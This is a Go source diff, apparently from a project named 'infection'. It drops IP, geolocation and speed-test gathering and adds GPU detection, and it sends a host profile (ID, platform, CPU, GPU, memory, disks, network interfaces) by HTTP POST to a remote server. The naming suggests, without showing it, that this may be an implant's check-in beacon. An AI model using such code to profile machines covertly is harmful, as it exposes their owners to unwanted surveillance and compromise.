@@ -5,9 +5,9 @@ import (
 	"fmt"
 	"github.com/parnurzeal/gorequest"
 	"gopkg.in/alecthomas/kingpin.v2"
-	Server "infection/server"
-	User "infection/user"
-	"io/ioutil"
+	//Server "infection/server"
+	//User "infection/user"
+	//"io/ioutil"
 	"log"
 	"net"
 	"strconv"
@@ -18,7 +18,7 @@ import (
 	//"github.com/shirou/gopsutil/cpu"
 	"github.com/shirou/gopsutil/host"
 	//"github.com/shirou/gopsutil/mem"
-	"infection/util/lib/wmi"
+	"infection/machineinfo/wmi"
 )
 
 var (
@@ -46,15 +46,17 @@ type machineInfo struct {
 	Hostid      string      `json:"hostid"`
 	Platform    string      `json:"platform"`
 	Cpu         int         `json:"cpu"`
+	Gpu         string      `json:"gpu"`
 	Mem         int         `json:"mem"`
 	Disk        []diskusage `json:"disk"`
 	NetCard     []intfInfo  `json:"net"`
-	OIp         string      `json:"ip"`
-	Isp         string      `json:"isp"`
-	Lat         string      `json:"lat"`
-	Lon         string      `json:"lon"`
-	Down        string      `json:"down"`
-	Up          string      `json:"up"`
+	SoftVersion string      `json:"softversion"`
+	//OIp         string      `json:"ip"`
+	//Isp         string      `json:"isp"`
+	//Lat         string      `json:"lat"`
+	//Lon         string      `json:"lon"`
+	//Down        string      `json:"down"`
+	//Up          string      `json:"up"`
 }
 type MachineSendStatusResponse struct {
 	Succeed bool `json:"succeed"`
@@ -65,22 +67,24 @@ type VersionDetail struct {
 	Hostid   string `json:"hostid"`
 }
 
+const VERSION string = "6"
+
 func MachineSend(addr string, finflag chan string) {
-	kingpin.Version("1.0.3")
-	kingpin.Parse()
-	setTimeout()
-	user := User.FetchUserInfo()
-	out := user.Show()
+	//kingpin.Version("1.0.3")
+	//kingpin.Parse()
+	//setTimeout()
+	//user := User.FetchUserInfo()
+	//out := user.Show()
 	//write outsite ip
-	ioutil.WriteFile("C:\\Windows\\Temp\\ip.txt", []byte(out.OIp), 0644)
-	list := Server.FetchServerList(user.Lat, user.Lon)
-	if *showList {
-		list.Show()
-		return
-	}
-	targets := list.FindServer(*serverIds)
-	targets.StartTest()
-	spd := targets.ShowResult()
+	//ioutil.WriteFile("C:\\Windows\\Temp\\ip.txt", []byte(out.OIp), 0644)
+	//list := Server.FetchServerList(user.Lat, user.Lon)
+	//if *showList {
+	//	list.Show()
+	//	return
+	//}
+	//targets := list.FindServer(*serverIds)
+	//targets.StartTest()
+	//spd := targets.ShowResult()
 	//down, _ := strconv.Atoi(spd.Down)
 	//up, _ := strconv.Atoi(spd.Up)
 	var versionDetail = GetSystemVersion()
@@ -91,19 +95,21 @@ func MachineSend(addr string, finflag chan string) {
 		Hostid:      versionDetail.Hostid,
 		StartUpTime: GetStartTime(),
 		Cpu:         GetCpuInfo(),
+		Gpu:         getGPUInfo(),
 		Mem:         GetMemory(),
 		Disk:        GetDiskInfo(),
 		NetCard:     GetIntfs(),
-		OIp:         out.OIp,
-		Isp:         out.Isp,
-		Lat:         out.Lat,
-		Lon:         out.Lon,
-		Down:        spd.Down,
-		Up:          spd.Up,
+		//OIp:         out.OIp,
+		//Isp:         out.Isp,
+		//Lat:         out.Lat,
+		//Lon:         out.Lon,
+		//Down:        spd.Down,
+		//Up:          spd.Up,
+		SoftVersion: VERSION,
 	}
 	machineSendStatusResponse := MachineSendStatusResponse{}
 	resp, _, err := gorequest.New().
-		Post(addr).
+		Post("http://" + addr + "/machine/machineInfo").
 		Send(MachineInfo).
 		EndStruct(&machineSendStatusResponse)
 	if err != nil {
@@ -293,6 +299,21 @@ func GetIntfs() []intfInfo {
 		}
 	}
 	return is
+}
+
+type gpuInfo struct {
+	Name string
+}
+
+//GPU name
+func getGPUInfo() string {
+
+	var gpuinfo []gpuInfo
+	err := wmi.Query("Select Name from Win32_VideoController", &gpuinfo)
+	if err != nil {
+		return ""
+	}
+	return gpuinfo[0].Name
 }
 
 //mainboard
